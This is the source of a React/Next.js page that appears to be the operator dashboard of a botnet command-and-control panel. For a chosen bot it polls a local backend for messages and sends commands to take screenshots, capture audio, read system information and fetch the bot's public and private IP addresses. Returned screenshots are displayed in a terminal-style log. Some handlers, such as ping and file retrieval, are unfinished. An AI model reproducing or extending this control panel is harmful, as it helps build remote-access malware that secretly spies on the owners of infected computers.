"use client"
import {
    Breadcrumb,
    BreadcrumbItem,
    BreadcrumbLink,
    Button,
} from '@chakra-ui/react'

import {
    Modal,
    ModalOverlay,
    ModalContent,
    ModalHeader,
    ModalFooter,
    ModalBody,
    ModalCloseButton,
} from '@chakra-ui/react'

import Terminal, {ColorMode, TerminalOutput} from 'react-terminal-ui';

import {useParams} from "next/navigation";
import {useEffect, useState} from "react";

import C2TerminalOutput from "@/components/C2TerminalOutput";
import BotTerminalOutput from "@/components/BotTerminalOutput";
import Image from "next/image";

type TerminalLine = typeof C2TerminalOutput | typeof BotTerminalOutput;

// [{"botId":"8C59A1A8-058C-0000-0000-000000000000","messages":[],"commands":[]}]
export interface Channel {
    botId : string;
    messages: any[]
    commands: any[]
}

export default function BotDetailPage() {

    const params = useParams();
    const currentBot =  params.id;

    const [channel, setChannel] = useState<Channel | null>(null)

    const [terminalLineData, setTerminalLineData] = useState<TerminalLine[]>([]);


    useEffect(() => {
        const timer = setInterval(() => getChannel(), 3000);
        return () => clearInterval(timer);
    }, []);

    async function getChannel() {
        const url = "http://localhost:3000/backend/channels";
        const res = await fetch(url);
        const data = await res.json();
        console.log(data);
        const botChannel = data.find((c: Channel) => c.botId === currentBot)
        setChannel(botChannel)

        // TODO : setTerminalLineData(data); // set terminal data
    }

    async function handleRefresh() {
        await getChannel()
    }


    async function handlePing() {

    }


    async function handleScreen()  {
        const payload = {
            "botId" : currentBot,
            "name" : "Screenshot",
            "args" : {}
        }

        const res = await fetch("http://localhost:3000/backend/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })

        await getChannel()
    }
    async function handleAudio()  {
        const payload = {
            "botId" : currentBot,
            "name" : "AudioCapture",
            "args" : {}
        }

        const res = await fetch("http://localhost:3000/backend/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })

        await getChannel()
    }

    async function handleSystemInfo() {
        const payload = {
            "botId" : currentBot,
            "name" : "GetSysInfo",
            "args" : {}
        }

        const res = await fetch("http://localhost:3000/backend/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })

    }

    async function handleFile() {
        throw new Error('Function not implemented.');
    }

    async function handlePublicIp(){
        const payload = {
            "botId" : currentBot,
            "name" : "GetPublicIp",
            "args" : {}
        }

        const res = await fetch("http://localhost:3000/backend/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })

    }

    async function handlePrivateIp() {

        const payload = {
            "botId" : currentBot,
            "name" : "GetPrivateIp",
            "args" : {}
        }

        const res = await fetch("http://localhost:3000/backend/commands", {
            method: "POST",
            body: JSON.stringify(payload),
            headers: {
                "Content-Type" : "application/json"
            }
        })

    }

    function renderMessage(message: any) {
        if (message.from === "c2") {

            if (message.uploadType === "screen") {
                return (
                    <TerminalOutput key={message}>
                        <img src={"http://localhost:3000/backend/storage/" + message.upload } alt={ message.upload} width={512} height={512}/>
                    </TerminalOutput>
                )
            }
            return <TerminalOutput key={message}>{"$root@C2 " + message.message}</TerminalOutput>
        } else {
            return <TerminalOutput key={message}>{ "$root@Bot " + message.message}</TerminalOutput>
        }
    }


    return (
        <main className="flex flex-wrap gap-4">
            <div className={"flex basis-full bg-gray-400  p-12 "}>
                <Breadcrumb>
                    <BreadcrumbItem>
                        <BreadcrumbLink href='/'>Dashboard</BreadcrumbLink>
                    </BreadcrumbItem>

                    <BreadcrumbItem isCurrentPage>
                        <BreadcrumbLink href={'/bots/'+currentBot}>Bot #{currentBot}</BreadcrumbLink>
                    </BreadcrumbItem>
                </Breadcrumb>
            </div>
            <div className={"flex basis-full flex-wrap p-4"}>
                <div className={"flex basis-full justify-between"}>
                    <h1>Bot Detail</h1>
                    <Button colorScheme='blue' onClick={handleRefresh}>Refresh</Button>
                </div>
                <div className={"flex basis-full gap-4"}>
                    <Button colorScheme='blue' onClick={handlePing}>Ping</Button>
                    <Button colorScheme='blue' onClick={handleScreen}>Screenshot</Button>
                    <Button colorScheme='blue' onClick={handleSystemInfo}>Get System Info</Button>
                    <Button colorScheme='blue' onClick={handleFile} >Get File</Button>
                    <Button colorScheme='blue' onClick={handlePublicIp}>Get Public Ip</Button>
                    <Button colorScheme='blue' onClick={handlePrivateIp}>Get Private Ip</Button>
                </div>
            </div>

            <div className={"flex basis-full flex-wrap p-4"}>
                <Terminal name='Bot channel' colorMode={ ColorMode.Dark }>
                    {channel && channel.messages.map((m) => {
                        return renderMessage(m)
                    })}
                </Terminal>
            </div>
        </main>
    )

}